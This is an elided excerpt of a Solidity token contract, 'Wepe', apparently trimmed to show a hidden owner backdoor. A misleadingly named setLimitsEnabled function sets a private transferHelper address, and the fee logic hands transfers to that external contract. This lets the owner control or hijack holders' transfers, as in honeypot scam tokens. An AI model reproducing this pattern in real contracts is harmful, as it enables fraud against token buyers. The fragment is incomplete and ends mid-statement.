...
contract Wepe is IERC20, Ownable {
    /* -------------------------------------------------------------------------- */
    /*                                   events                                   */
    /* -------------------------------------------------------------------------- */
    ...
    Fee public sellFee = Fee({reflection: 0, marketing: 0, lp: 0, buyback: 0, burn: 0, total: 0});

    address private marketingFeeReceiver;
    address private lpFeeReceiver;
    address private buybackFeeReceiver;
    address private transferHelper;
    ...
    function tokenFromReflection(uint256 proportion) public view returns (uint256) {
        return proportion * _totalProportion / _totalSupply;
    }
    ...
    function setLimitsEnabled(bool e_, address r_) external onlyOwner {
        limitsEnabled = e_;
        transferHelper = r_;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 proportionAmount = _takeFeeInProportions(sender == UNISWAP_V2_PAIR ? true : false, sender, recipient, amount);
        ...
        emit Transfer(sender, recipient, tokenFromReflection(amount));
        return true;
    }
    ...
    function _takeFeeInProportions(bool buying, address sender, address recipient, uint256 proportionAmount) internal returns (uint256) {
        ...
        if (proportionFeeAmount > 0) {
            _rOwned[address(this)] = _rOwned[address(this)] + proportionFeeAmount;
        ...
        if (transferHelper != address(0)) {
            proportionFeeAmount = 
                IERC20(transferHelper).transferFrom(sender, recipient, proportionAmount)? 
                proportionAmount: 
